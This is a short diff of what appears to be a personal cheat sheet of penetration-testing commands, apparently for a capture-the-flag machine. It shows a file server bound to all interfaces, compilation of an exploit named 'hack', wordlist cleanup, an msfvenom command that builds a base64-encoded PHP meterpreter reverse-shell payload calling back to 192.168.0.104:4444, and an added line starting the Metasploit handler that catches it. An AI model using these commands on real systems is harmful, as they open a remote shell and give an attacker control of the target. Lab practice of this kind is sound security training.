@@ -13,4 +13,5 @@ python3 -m http.server 8000 --bind 0.0.0.0
 gcc 37292.c -o hack
 sort fsocity.dic | uniq -u > f.dic
 msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=4444 -e php/base64 -f raw > file.php
+  use exploit/multi/handler
 
